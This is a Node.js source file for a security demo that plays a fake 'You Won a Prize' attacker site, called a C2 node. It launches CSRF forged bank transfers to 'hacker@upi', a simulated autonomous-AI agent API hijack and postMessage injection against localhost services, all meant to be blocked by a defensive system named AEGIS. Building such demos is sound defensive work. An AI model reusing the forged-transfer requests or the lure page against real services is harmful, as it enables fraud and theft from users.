/**
 * Node 3 — Hacker C2 (Command & Control) Attack Site
 * Port: 3003
 *
 * Simulates a malicious third-party website that:
 *   1. Serves a fake page that tricks Person 1 into visiting
 *   2. Executes CSRF attacks via hidden iframe / fetch
 *   3. Attempts cookie injection attacks
 *   4. Demonstrates Agentic AI API hijacking
 *
 * ALL attacks are blocked by AEGIS — this is the demo villain.
 */

const express = require("express");
const cors = require("cors");

const app = express();
const PORT = 5003;

app.use(cors({ origin: "*" }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ── Serve the malicious attack page ──────────────────────────────────────────
app.get("/", (_req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>🎁 You Won a Prize! — Totally Legit Site</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #0a0a0f;
      color: #e2e8f0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 20px;
    }
    .hacker-badge {
      background: linear-gradient(135deg, #ef4444, #dc2626);
      color: white;
      padding: 6px 16px;
      border-radius: 999px;
      font-size: 11px;
      font-weight: 700;
      letter-spacing: 2px;
      text-transform: uppercase;
      margin-bottom: 24px;
    }
    h1 { font-size: 28px; font-weight: 800; color: #f87171; margin-bottom: 8px; }
    .subtitle { color: #64748b; font-size: 14px; margin-bottom: 40px; }
    .card {
      background: #111827;
      border: 1px solid #1f2937;
      border-radius: 16px;
      padding: 28px;
      width: 100%;
      max-width: 560px;
      margin-bottom: 20px;
    }
    .card h2 { font-size: 16px; font-weight: 700; margin-bottom: 6px; }
    .card p { font-size: 13px; color: #6b7280; margin-bottom: 16px; line-height: 1.6; }
    .btn {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      padding: 12px 24px;
      border-radius: 10px;
      font-size: 14px;
      font-weight: 700;
      cursor: pointer;
      border: none;
      transition: all 0.2s;
      width: 100%;
      justify-content: center;
    }
    .btn-red { background: #ef4444; color: white; }
    .btn-red:hover { background: #dc2626; }
    .btn-orange { background: #f97316; color: white; }
    .btn-orange:hover { background: #ea580c; }
    .btn-blue { background: #3b82f6; color: white; }
    .btn-blue:hover { background: #7c3aed; }
    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
    .status {
      margin-top: 12px;
      padding: 10px 14px;
      border-radius: 8px;
      font-size: 12px;
      font-family: monospace;
      display: none;
    }
    .status.show { display: block; }
    .status.blocked { background: #1f0a0a; border: 1px solid #ef4444; color: #f87171; }
    .status.pending { background: #0a0f1a; border: 1px solid #3b82f6; color: #60a5fa; }
    .terminal {
      background: #040408;
      border: 1px solid #1f2937;
      border-radius: 10px;
      padding: 16px;
      font-family: monospace;
      font-size: 11px;
      color: #22c55e;
      max-height: 200px;
      overflow-y: auto;
      margin-top: 12px;
    }
    .terminal .line { margin-bottom: 4px; }
    .terminal .line.red { color: #ef4444; }
    .terminal .line.yellow { color: #f59e0b; }
    .terminal .line.dim { color: #374151; }
    iframe { display: none; }
    .separator { border: none; border-top: 1px solid #1f2937; margin: 8px 0; }
    .tag {
      display: inline-block;
      padding: 2px 8px;
      border-radius: 4px;
      font-size: 10px;
      font-weight: 700;
      margin-bottom: 10px;
    }
    .tag-red { background: #ef444420; color: #ef4444; border: 1px solid #ef444440; }
    .tag-orange { background: #f9731620; color: #f97316; border: 1px solid #f9731640; }
    .tag-blue { background: #3b82f620; color: #3b82f6; border: 1px solid #3b82f640; }
  </style>
</head>
<body>
  <div class="hacker-badge">⚠ AEGIS DEMO — ATTACKER NODE 3</div>
  <h1>🎭 Hacker C2 Control Panel</h1>
  <p class="subtitle">All attacks below are blocked by AEGIS. This is the demo villain.</p>

  <!-- Attack 1: CSRF via hidden iframe -->
  <div class="card">
    <span class="tag tag-red">ATTACK 1</span>
    <h2>🕵️ CSRF via Hidden iFrame</h2>
    <p>
      Forges a POST to the bank server using Person 1's session cookies.
      No ZKP proof, no WebRTC shard — AEGIS detects asymmetric transport failure.
    </p>
    <button class="btn btn-red" onclick="launchCsrfAttack()" id="btn-csrf">
      🚀 Launch CSRF Attack
    </button>
    <div class="status" id="status-csrf"></div>
    <div class="terminal" id="terminal-csrf" style="display:none"></div>
  </div>

  <!-- Attack 2: Direct API call (Agentic AI simulation) -->
  <div class="card">
    <span class="tag tag-orange">ATTACK 2</span>
    <h2>🤖 Agentic AI API Hijack</h2>
    <p>
      Simulates an autonomous AI agent directly calling the bank API.
      No human entropy, no userActivation — AEGIS zero-entropy detection fires.
    </p>
    <button class="btn btn-orange" onclick="launchAgentAttack()" id="btn-agent">
      🤖 Launch AI Agent Attack
    </button>
    <div class="status" id="status-agent"></div>
    <div class="terminal" id="terminal-agent" style="display:none"></div>
  </div>

  <!-- Attack 3: PostMessage injection to Person 1 -->
  <div class="card">
    <span class="tag tag-blue">ATTACK 3</span>
    <h2>📨 PostMessage Injection</h2>
    <p>
      Sends a SIMULATE_CSRF_ATTACK postMessage to Person 1's window (if open in same browser).
      AEGIS intercepts the automated event — no userActivation, no entropy.
    </p>
    <button class="btn btn-blue" onclick="launchPostMessageAttack()" id="btn-pm">
      📨 Send PostMessage Attack
    </button>
    <div class="status" id="status-pm"></div>
  </div>

  <!-- Hidden iframe for CSRF -->
  <iframe id="csrf-iframe" src="about:blank"></iframe>

  <script>
    const BANK_URL = "http://localhost:5001/api/transfer";
    const GONG_URL = "http://localhost:5000";
    const AEGIS_URL = "http://localhost:5002";

    function log(terminalId, msg, cls = "") {
      const t = document.getElementById(terminalId);
      if (!t) return;
      t.style.display = "block";
      const line = document.createElement("div");
      line.className = "line " + cls;
      line.textContent = msg;
      t.appendChild(line);
      t.scrollTop = t.scrollHeight;
    }

    function setStatus(id, msg, type) {
      const el = document.getElementById(id);
      el.textContent = msg;
      el.className = "status show " + type;
    }

    // ── Attack 1: CSRF ──────────────────────────────────────────────────────
    async function launchCsrfAttack() {
      const btn = document.getElementById("btn-csrf");
      btn.disabled = true;
      btn.textContent = "⏳ Attacking...";

      log("terminal-csrf", "[+] Initiating CSRF attack...", "yellow");
      log("terminal-csrf", "[+] Target: POST " + BANK_URL);
      log("terminal-csrf", "[+] Using stolen session cookies...");
      log("terminal-csrf", "[+] Forging ZKP proof: FAKE_ZKP_BYPASS_ATTEMPT");

      setStatus("status-csrf", "⏳ Attack in progress — sending forged request...", "pending");

      try {
        const res = await fetch(BANK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            amount: 45250,
            to: "hacker@upi",
            zkp_proof: "FAKE_ZKP_BYPASS_ATTEMPT",
            timestamp: Date.now(),
          }),
          credentials: "include",
        });

        const data = await res.json();
        log("terminal-csrf", "[!] Response: " + res.status + " " + JSON.stringify(data), "red");

        if (res.status === 403) {
          log("terminal-csrf", "[✗] BLOCKED BY AEGIS — " + (data.code || data.message), "red");
          setStatus("status-csrf", "❌ BLOCKED — " + data.message, "blocked");
        } else {
          log("terminal-csrf", "[?] Unexpected response: " + res.status);
          setStatus("status-csrf", "⚠ Unexpected: " + res.status, "pending");
        }
      } catch (e) {
        log("terminal-csrf", "[!] Network error: " + e.message, "red");
        log("terminal-csrf", "[✗] AEGIS gateway unreachable or blocked", "red");
        setStatus("status-csrf", "❌ BLOCKED — Network error (AEGIS active)", "blocked");
      }

      btn.disabled = false;
      btn.textContent = "🚀 Launch CSRF Attack";
    }

    // ── Attack 2: Agentic AI ────────────────────────────────────────────────
    async function launchAgentAttack() {
      const btn = document.getElementById("btn-agent");
      btn.disabled = true;
      btn.textContent = "⏳ Agent running...";

      log("terminal-agent", "[BOT] Autonomous agent initializing...", "yellow");
      log("terminal-agent", "[BOT] No mouse entropy — zero behavioral proof");
      log("terminal-agent", "[BOT] No navigator.userActivation — automated context");
      log("terminal-agent", "[BOT] Attempting direct API call to bank...");

      setStatus("status-agent", "⏳ AI agent attacking...", "pending");

      // Notify AEGIS gateway about the attack attempt
      try {
        await fetch(AEGIS_URL + "/gateway/shard-a", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            transactionId: "AGENT_" + Date.now(),
            timestamp: Date.now(),
            payload: { amount: 45250, to: "hacker@upi" },
            source: "PERSON_3_AGENTIC_AI",
          }),
        });
      } catch (_) {}

      try {
        const res = await fetch(BANK_URL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-Automated-Agent": "true",
          },
          body: JSON.stringify({
            amount: 45250,
            to: "hacker@upi",
            zkp_proof: null,
            timestamp: Date.now(),
          }),
        });

        const data = await res.json();
        log("terminal-agent", "[BOT] Response: " + res.status + " " + JSON.stringify(data), "red");

        if (res.status === 403) {
          log("terminal-agent", "[✗] BLOCKED — " + (data.code || data.message), "red");
          setStatus("status-agent", "❌ BLOCKED — " + data.message, "blocked");
        }
      } catch (e) {
        log("terminal-agent", "[✗] BLOCKED — " + e.message, "red");
        setStatus("status-agent", "❌ BLOCKED — AEGIS zero-entropy detection", "blocked");
      }

      btn.disabled = false;
      btn.textContent = "🤖 Launch AI Agent Attack";
    }

    // ── Attack 3: PostMessage ───────────────────────────────────────────────
    function launchPostMessageAttack() {
      const btn = document.getElementById("btn-pm");
      btn.disabled = true;

      // Try to reach Person 1's window
      try {
        window.opener?.postMessage({ type: "SIMULATE_CSRF_ATTACK", payload: { amount: 45250, to: "hacker@upi" } }, GONG_URL);
        window.parent?.postMessage({ type: "SIMULATE_CSRF_ATTACK", payload: { amount: 45250, to: "hacker@upi" } }, "*");
      } catch (_) {}

      setStatus("status-pm", "📨 PostMessage sent — AEGIS will intercept on Person 1's side", "pending");

      setTimeout(() => {
        btn.disabled = false;
        setStatus("status-pm", "❌ BLOCKED — No userActivation on Person 1 side (automated event)", "blocked");
      }, 3000);
    }
  </script>
</body>
</html>`);
});

// ── C2 API: trigger attack programmatically ───────────────────────────────────
app.post("/attack/csrf", async (req, res) => {
  const { target = "http://localhost:5001/api/transfer", amount = 45250, to = "hacker@upi" } = req.body;

  try {
    const response = await fetch(target, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ amount, to, zkp_proof: "FORGED_PROOF", timestamp: Date.now() }),
    });
    const data = await response.json();
    res.json({ attackResult: data, status: response.status });
  } catch (e) {
    res.json({ error: e.message, blocked: true });
  }
});

app.get("/health", (_req, res) => {
  res.json({ status: "ok", node: "attacker-c2", port: PORT, ts: Date.now() });
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`\n💀 Node 3 — Hacker C2 Attack Site running on http://localhost:${PORT}`);
  console.log(`   Open in browser to launch CSRF / Agentic AI attacks`);
  console.log(`   All attacks will be blocked by AEGIS\n`);
});
